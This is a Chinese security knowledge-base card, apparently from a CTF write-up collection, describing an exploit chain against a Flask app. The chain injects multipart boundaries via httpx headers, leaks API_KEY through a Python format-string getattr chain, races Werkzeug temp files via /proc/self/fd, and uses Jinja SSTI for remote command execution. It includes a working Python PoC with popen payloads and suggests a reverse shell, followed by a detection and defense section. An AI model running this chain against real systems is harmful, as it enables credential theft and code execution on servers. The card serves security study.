---
id: web-python-framework-httpx-boundary-injection-werkzeug-tempfile-jinja-ssti
title: httpx multipart boundary 注入 + Werkzeug 临时文件 /proc/self/fd 竞争：从 API_KEY 泄露到 Jinja SSTI RCE
type: scenario
domain: web
path: web/python/framework
technique: httpx-boundary-injection-werkzeug-tempfile-fd-jinja-ssti
tags:
- python
- flask
- werkzeug
- httpx
- multipart
- boundary-injection
- tempfile
- race-condition
- jinja2
- ssti
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T10:15:08+08:00'
  notes: 已对照 cutter 段核对：httpx boundary 注入、action 覆盖、Python getattr 表达式泄露 API_KEY、Werkzeug SpooledTemporaryFile 500KB、/proc/self/fd 竞争渲染 Jinja 均吻合；PoC 未执行
url: /docs/web/python/framework/web-python-framework-httpx-boundary-injection-werkzeug-tempfile-jinja-ssti/
draft: false
kb_aliases:
- httpx boundary 注入
- multipart 边界注入
- Werkzeug 临时文件竞争
- SpooledTemporaryFile 500KB
- /proc/self/fd 模板
- Jinja SSTI
- cutter
---

## 一句话结论

应用把用户可控的 header 名/值传给 httpx；当其中 `Content-Type` 为 `multipart/form-data` 时，httpx 直接采用其中的 `boundary` 构造请求体，并且 multipart 文本协议没有长度/转义校验，攻击者可注入额外的 form-data 字段覆盖 `action`，用 Python 表达式 `{0.__class__.__init__.__globals__[sys].modules[__main__].API_KEY}` 泄露密钥。拿到 API_KEY 后，向 `/heartbeat` 上传 >500KB 的 multipart，Werkzeug 会把内容 spool 到临时文件；同时用 `/admin?tmpl=/proc/self/fd/N` 竞争渲染其中预置的 Jinja 模板，执行命令。

## 原理

- **httpx boundary 来源**：`httpx.Request.__init__` 若看到 `content-type` 带 `boundary`，会调用 `get_multipart_boundary_from_content_type` 并把它传给 `encode_request`；boundary 完全由请求头决定，未做随机化/校验。
- **multipart 协议无长度校验**：每个 part 以 `--{boundary}` 分隔，最后 `--{boundary}--`；攻击者控制一个 part 的内容时，可以写入 `--{boundary}` + 新的 `Content-Disposition: form-data; name="action"` 块，从而在服务端生成额外的表单字段，覆盖原有 `action` 值（示例为 `{"type":"debug"}`）。
- **Python 表达式求值**：应用的 `format` 函数对 action 内容做 `str.format` 风格求值，只允许 `getattr` 链；payload `{0.__class__.__init__.__globals__[sys].modules[__main__].API_KEY}` 从整数 `0` 出发，沿 `__class__.__init__.__globals__` 拿到模块全局字典，再取 `sys.modules['__main__'].API_KEY`，把密钥泄露到响应。
- **Werkzeug 临时文件**：Flask 的 `request.form`/`request.files` 解析 multipart 时，`default_stream_factory` 使用 `SpooledTemporaryFile(max_size=500*1024)`；写入超过 500KB 后 `rollover()` 创建真实临时文件，文件 fd 在请求解析期间保持打开，路径可通过 `/proc/self/fd/<N>` 猜测/枚举。
- **模板读取竞争**：`/admin` 路由用 API_KEY 鉴权，并从 `tmpl` 参数指定的路径读取模板内容交给 Jinja 渲染。攻击者把 Jinja payload 放在上传内容中（`<start>` + 填充 + `<end>` + `{{url_for.__globals__['os'].popen('cmd').read()}}`），在临时文件存在的时间窗口内请求 `/admin?tmpl=/proc/self/fd/N`；一旦命中，Jinja 渲染执行 `popen`，命令输出落在 `<end>` 之后可被读回。
- **为什么要竞争**：临时文件在请求结束后被删除；攻击者必须在上传请求仍在解析/阻塞时并发渲染。示例用线程持续请求并检查响应中的 `<end>`。

## 触发条件

- 应用把用户可控 header 键/值传入 httpx，且未过滤 `Content-Type`/boundary；httpx 版本使用用户提供的 boundary。
- 存在对 action/format 的 Python 表达式求值（至少支持 getattr 链），或可用其它方式泄露 API_KEY。
- `/admin` 等路由用 API_KEY 鉴权并从用户可控路径读取文件交给 Jinja（或其它模板引擎）渲染。
- Werkzeug 版本使用 `SpooledTemporaryFile(500KB)`，临时文件在请求期间可经 `/proc/self/fd` 访问；攻击者能并发请求。
- 临时文件 fd 编号可猜测（示例 5）或可枚举；应用进程有权限读 `/proc/self/fd`。

## 利用步骤

1. **泄露 API_KEY**：向 `/heartbeat` 发送 `client=Content-Type`、`token=multipart/form-data; boundary=asdasdasd`、`text` 为包含 `--asdasdasd` + `action` 块的 payload；响应中的表达式结果即 `API_KEY`。
2. **准备 Jinja payload**：构造 >500KB 的表单文件内容：`<start>` + 大量填充 + `<end>` + `{{url_for.__globals__['os'].popen('cat /flag*').read()}}`，作为 multipart 文件字段上传到 `/heartbeat`。
3. **并发渲染**：启动线程反复请求 `/admin?tmpl=/proc/self/fd/5`（带 `Authorization: <API_KEY>`），同时发送大文件请求；当请求解析到临时文件时，`/admin` 读取该 fd 并渲染 Jinja。
4. **检查回显**：响应中出现 `<end>` 且其后为命令输出即成功；若 fd 不对，尝试 3~10 或根据环境调整。
5. **执行命令**：把 `popen` 的命令换成读 flag、反弹 shell、写文件等。
6. **重复**：临时文件窗口短，循环发送直到命中。

## PoC

```python
def get_key():
    boundary = "asdasdasd"
    text = f'''
{{0.__class__.__init__.__globals__[sys].modules[__main__].API_KEY}}
--{boundary}
Content-Disposition: form-data; name="action"; filename="action"
Content-Type: application/json

{{"type":"debug"}}
--{boundary}--
'''.strip()
    data = {
        "client": "Content-Type",
        "token": f"multipart/form-data; boundary={boundary}",
        "text": text,
    }
    return requests.post(url + "/heartbeat", data=data).text.strip()

def send(command):
    size = 500 * 1024 + 1
    payload = (b"<start>" + b" " * size + b"<end>"
               + b"{{url_for.__globals__['os'].popen('" + command.encode() + b"').read()}}")
    requests.post(url + "/heartbeat", files={"payload": ("payload", BytesIO(payload), "text/plain")})

def render(key):
    while STOP:
        r = requests.get(url + "/admin", params={"tmpl": "/proc/self/fd/5"},
                         headers={"Authorization": key})
        if "<end>" in r.text:
            print(r.text.split("<end>")[1].strip()); return

key = get_key()
t = threading.Thread(target=render, args=(key,)); t.start()
send("cat /flag*")
```

boundary 名称、fd 编号、模板路径、`action` 结构依目标应用而定；本卡不执行 PoC。

## 变体与关联

- **其它 HTTP 客户端**：任何“信任用户 Content-Type boundary”的客户端都可能被 multipart 注入；检查 `requests`/`httpx`/`aiohttp` 的 boundary 处理。
- **临时文件路径**：`/proc/self/fd/N` 也可用于读取其它已打开文件（配置、日志、数据库）；不限于 Jinja 模板。
- **模板引擎**：Jinja `render_template_string`、Mako、Velocity、Freemarker 等从文件读取并渲染用户可控路径时都可能 RCE；关键是路径可控 + 内容可控。
- **关联**：[[web/python-ssti-internal-snippet-include-prompt-access]]（模板 include 泄露）、[[web-python-framework-flask-debug-pin-forgery]]（Flask/Werkzeug）、[[web-java-deser-fastjson-fd-jar-no-egress-rce]]（/proc/self/fd 读临时文件）。
- **边界**：需要用户 header 能进入 httpx、表达式求值可泄露密钥、`/admin` 可从任意路径读模板；若 boundary 被随机化/校验、临时文件使用 `O_TMPFILE` 或权限隔离、模板路径白名单，利用失败。

## 检测与防御

- **header 过滤**：不要用用户输入作为 HTTP 客户端的 header 名/值；对 `Content-Type`/boundary 做白名单/重写，使用客户端自动生成的随机 boundary。
- **表达式安全**：禁止对用户输入做 Python `format`/`eval`/getattr 链求值；使用严格 schema/枚举；API_KEY 不放在 `__main__` 全局。
- **模板安全**：`/admin` 只允许加载预定义模板，禁止 `tmpl` 路径参数；使用 Jinja sandbox，禁用 `__globals__`/`os`/`subprocess`。
- **临时文件**：使用 `O_TMPFILE`/不可预测路径，解析完成后立即关闭；限制上传大小；`/proc/self/fd` 对应用进程最小权限。
- **检测**：multipart 请求中出现重复 boundary/额外 `action` 字段；响应中出现 `API_KEY`/表达式结果；`/admin?tmpl=/proc/self/fd/*` 请求；Jinja 渲染后子进程/命令执行。
- **响应**：轮换 API_KEY、修复 header 传递、审计模板读取接口、检查临时文件是否被利用。
